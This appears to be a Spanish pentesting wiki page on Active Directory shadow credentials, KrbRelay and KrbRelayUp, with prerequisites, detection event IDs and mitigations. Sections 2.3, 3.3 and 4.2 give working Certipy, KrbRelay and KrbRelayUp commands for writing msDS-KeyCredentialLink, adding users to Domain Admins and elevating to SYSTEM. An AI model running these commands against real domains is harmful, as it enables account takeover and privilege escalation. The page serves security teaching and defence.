---
title: "Shadow credentials, KrbRelay y KrbRelayUp"
tags: [windows, active-directory, kerberos, shadow-credentials, krbrelay, krbrelayup, pkinit, ldap]
---

# Shadow credentials, KrbRelay y KrbRelayUp

[🇬🇧 English](shadow-credentials-krbrelay.en.md) | **Español**

## 1. Cuándo mirar aquí

Hay tres técnicas que suelen aparecer juntas en AD, pero **no son lo mismo**:

| Técnica | Qué es | Qué necesita |
|---|---|---|
| Shadow credentials | Añadir una clave a `msDS-KeyCredentialLink` y autenticar por PKINIT | Escritura sobre el atributo del objeto y un KDC con certificado |
| KrbRelay | Retransmitir una autenticación Kerberos a LDAP/LDAPS u otro servicio | LDAP sin signing/channel binding y un CLSID/contexto que fuerce la autenticación |
| KrbRelayUp | Automatizar relay + RBCD o shadow credential + elevación local | Contexto local en un host del dominio y las condiciones de KrbRelay |

Si solo hay una plantilla ADCS vulnerable, eso es **ESC1/ESC4/ESC8**, no shadow credentials. Si el relay va a LDAP, no es RBCD por sí solo: RBCD es el objeto que se modifica después.

## 2. Shadow credentials

### 2.1 Qué se escribe

`msDS-KeyCredentialLink` es un atributo multivalor introducido en Windows Server 2016 para **Key Trust** de Windows Hello for Business. Guarda un `KEYCREDENTIALLINK_BLOB` con la clave pública y metadatos; el KDC lo usa para PKINIT. No es una contraseña ni un certificado emitido por una CA.

Microsoft documenta que la escritura validada exige que el solicitante sea el propio objeto y que la clave tenga `KeyUsage = NGC` y `KeySource = AD`; en un ataque, el derecho efectivo suele venir de `GenericWrite`, `GenericAll`, `WriteProperty` o una ACL equivalente sobre el objeto. La validación exacta depende del objeto y del tipo de escritura; no basta con "tener LDAP".

### 2.2 Condiciones

- El objeto objetivo es un usuario o un equipo.
- El atacante puede escribir en `msDS-KeyCredentialLink` (o delegar ese derecho).
- El DC tiene certificado de KDC para **PKINIT**. Sin él, la autenticación falla con `KDC_ERR_PADATA_TYPE_NOSUPP`; eso no convierte la técnica en ESC1.
- Reloj sincronizado (Kerberos tolera ±5 minutos).
- No hace falta una plantilla ADCS ni una CA para emitir el certificado del atacante: la clave es la que se registra.

### 2.3 Ataque con Certipy

Con credenciales de una cuenta que tenga el derecho:

```bash
certipy shadow auto -username '<USER>@<DOMAIN>' -password '<PASS>' \
  -account '<TARGET>' -target '<DC>'
```

`shadow auto` genera una clave, escribe el blob, pide un TGT por PKINIT y devuelve un `.pfx` y un `.ccache`. Si se parte de un ticket:

```bash
KRB5CCNAME='<USER>.ccache' certipy shadow auto \
  -username '<USER>@<DOMAIN>' -account '<TARGET>' -k -target '<DC>'
```

Autenticación y recuperación del hash:

```bash
certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC>'
# alternativa: gettgtpkinit.py -cert-pfx '<TARGET>.pfx' -pfx-pass '<PFX_PASS>' \
#   '<DOMAIN>/<TARGET>' '<TARGET>.ccache'
```

Con el TGT se accede a los recursos que permita la cuenta. Si el objetivo es un equipo, hay que tener en cuenta que el ticket y el hash del equipo no equivalen a una sesión interactiva: según el caso se usa S4U2Self, un servicio o un movimiento lateral.

Para limpiar las claves añadidas:

```bash
certipy shadow clear -username '<USER>@<DOMAIN>' -password '<PASS>' \
  -account '<TARGET>' -target '<DC>'
```

**Cuidado:** borrar todas las entradas de un objeto que usa Windows Hello for Business rompe el inicio de sesión del usuario. En un engagement, hay que registrar qué se añadió y retirar solo lo propio.

### 2.4 Persistencia

La clave sobrevive al cambio de contraseña del objeto. Por eso es una **persistencia** además de una escalada: rotar la contraseña no la elimina. La respuesta es retirar el valor de `msDS-KeyCredentialLink` y revisar el resto de credenciales de clave.

## 3. KrbRelay

### 3.1 Qué hace

KrbRelay es un framework de **retransmisión Kerberos**. Fuerza una autenticación de la máquina o del usuario mediante un CLSID/COM, captura el AP-REQ y lo presenta a LDAP/LDAPS, HTTP, EWS, SMBv2, RPC o SAMR/SCMR, entre otros. En AD, la variante LDAP permite escribir atributos como miembro de grupo, `msDS-KeyCredentialLink` o `msDS-AllowedToActOnBehalfOfOtherIdentity`.

No es un exploit de memoria ni un volcado de credenciales: es un **relevo de autenticación**. La identidad que llega al LDAP es la de la cuenta forzada, no la del atacante.

### 3.2 Condiciones

- **LDAP signing no exigido** para el relay a LDAP; con channel binding estricto también se bloquea.
- El CLSID debe permitir autenticación de red con el nivel de impersonación adecuado (`IDENTIFY` suele bastar para LDAP; SMB exige más).
- El contexto de sesión debe poder iniciar el servidor COM; en WinRM no interactivo hace falta un wrapper como `RunasCs`.
- Reloj sincronizado.
- Si se crea una cuenta de equipo para RBCD, `MachineAccountQuota` debe permitirlo.
- El DC debe ser accesible por el protocolo elegido; LDAPS no es inmune si el channel binding no está enforced.

### 3.3 Comandos

```powershell
# Añadir un miembro a un grupo vía LDAP relay
.\KrbRelay.exe -spn ldap/<DC> ^
  -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 ^
  -add-groupmember "Domain Admins" <USER>

# Escribir una shadow credential en la identidad relayada
.\KrbRelay.exe -spn ldap/<DC> ^
  -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred

# Cross-session: CLSID y sesión distintos
.\KrbRelay.exe -spn ldap/<DC> -session 2 ^
  -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -shadowcred <TARGET>
```

`-rbcd <SID>` escribe `msDS-AllowedToActOnBehalfOfOtherIdentity`; `-shadowcred [target]` escribe `msDS-KeyCredentialLink`; `-add-groupmember` modifica la membresía. El CLSID no es universal: cambia con la sesión y con el servicio que se quiere forzar.

## 4. KrbRelayUp

### 4.1 Qué añade

KrbRelayUp es un wrapper de **elevación local** en hosts unidos al dominio. Encadena:

1. creación opcional de una cuenta de equipo;
2. coerción de la autenticación de la cuenta de máquina local;
3. relay de esa autenticación a LDAP;
4. RBCD o shadow credential sobre la cuenta de máquina;
5. S4U2Self/SCMUACBypass para ejecutar como SYSTEM.

La condición crítica es la misma: **LDAP signing no enforced** en la variante LDAP. La variante ADCS Web Enrollment evita LDAP, pero depende de que el endpoint esté disponible y no exija EPA.

### 4.2 Comandos

```powershell
# RBCD: crear cuenta de equipo y relay
.\KrbRelayUp.exe relay -d '<DOMAIN>' -cn '<COMPUTER>' -cp '<PASS>' -c -m rbcd
.\KrbRelayUp.exe spawn -d '<DOMAIN>' -cn '<COMPUTER>' -cp '<PASS>' -i administrator

# Shadow credential, sin crear otra cuenta de equipo
.\KrbRelayUp.exe full -m shadowcred --ForceShadowCred
```

`-m rbcd` necesita una cuenta de equipo (propia o creada con `-c`) y `MachineAccountQuota`; `-m shadowcred` no la necesita. `-m adcs` usa Web Enrollment. La sintaxis cambia entre versiones: comprobar `-h` antes de ejecutar.

### 4.3 Diferencias prácticas

| Pregunta | KrbRelay | KrbRelayUp |
|---|---|---|
| Nivel | Primitiva manual | Cadena automatizada |
| Objetivo | LDAP u otro servicio | Elevación local a SYSTEM |
| Modifica | Grupo, shadow credential o RBCD | RBCD/shadow credential + S4U2Self |
| Requiere contexto local | No necesariamente | Sí, en un host del dominio |
| Requiere cuenta de equipo | Solo para RBCD | Solo en la variante RBCD |
| LDAP signing | Debe estar desactivado | También, salvo variante ADCS |

## 5. Detección

- **5136** (Directory Service Changes) sobre `msDS-KeyCredentialLink` o `msDS-AllowedToActOnBehalfOfOtherIdentity`; conservar el valor del atributo y el SID del escritor.
- **4662** (Directory Service Access) si hay SACL sobre el objeto; correlacionar con el escritor y el host de origen.
- **4768/4769** anómalos: PKINIT desde un host no habitual, TGT para una cuenta que no usa WHfB, o servicio con SPN raro.
- **4624** tipo 3/10 desde el DC o desde un host de administración no inventariado.
- **4741** (cuenta de equipo creada) y **4720** (usuario creado) en la variante RBCD.
- **7045/4697** si la fase final instala un servicio.
- En LDAP, revisar fallos de signing/channel binding y binds Kerberos desde hosts que no son DC.

La correlación clave es **quién escribe** (5136/4662), **desde dónde** (4624/4768) y **qué cuenta se beneficia** (4768/4769). Una sola alerta no distingue una inscripción legítima de WHfB de un abuso.

## 6. Mitigación

- Restringir `GenericWrite`, `GenericAll` y `WriteProperty` sobre usuarios y equipos; aplicar tiering y revisar ACLs con BloodHound.
- Auditar `msDS-KeyCredentialLink` y `msDS-AllowedToActOnBehalfOfOtherIdentity`; alertar de escrituras fuera del flujo de inscripción de WHfB.
- Retirar claves huérfanas o desconocidas; no borrar a ciegas las de usuarios con WHfB.
- Exigir **LDAP signing** y **channel binding**; es la mitigación directa del relay LDAP. No impide una escritura autenticada legítima, así que no sustituye al control de ACLs.
- Poner `MachineAccountQuota` a 0 si no se necesitan equipos no administrados; monitorizar 4741.
- Restringir o proteger ADCS Web Enrollment (EPA, autenticación fuerte) si KrbRelayUp puede usar la variante ADCS.
- Revisar KB5014754 y el modelo de key trust, pero no presentarlo como parche de una ACL delegada.

## 7. Errores comunes

- **"Shadow credentials = ESC1"**: no. ESC1 es una plantilla que permite elegir el sujeto; shadow credentials es key trust sobre un atributo.
- **"KrbRelay = RBCD"**: no. KrbRelay es el relay; RBCD es una de las escrituras que se pueden hacer después.
- **"LDAPS evita el relay"**: solo si el channel binding está enforced. LDAPS sin binding no es una barrera suficiente.
- **"El certificado del atacante lo emite la CA"**: en shadow credentials no hay solicitud a la CA; la clave se registra en el atributo.
- **"Borrar todo `msDS-KeyCredentialLink` es seguro"**: puede romper WHfB. Documentar y retirar solo lo añadido.
- **"PKINIT siempre funciona"**: si el DC no tiene certificado de KDC, falla con `KDC_ERR_PADATA_TYPE_NOSUPP`.

## 8. Referencias

- <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c>
- <https://learn.microsoft.com/en-us/windows/security/identity-protection/hello-for-business/deploy/hybrid-key-trust>
- <https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover>
- <https://www.microsoft.com/en-us/security/blog/2022/05/25/detecting-and-preventing-privilege-escalation-attacks-leveraging-kerberos-relaying-krbrelayup>
- <https://github.com/cube0x0/KrbRelay>
- <https://github.com/Dec0ne/KrbRelayUp>
- <https://github.com/ly4k/Certipy>
- <https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers>
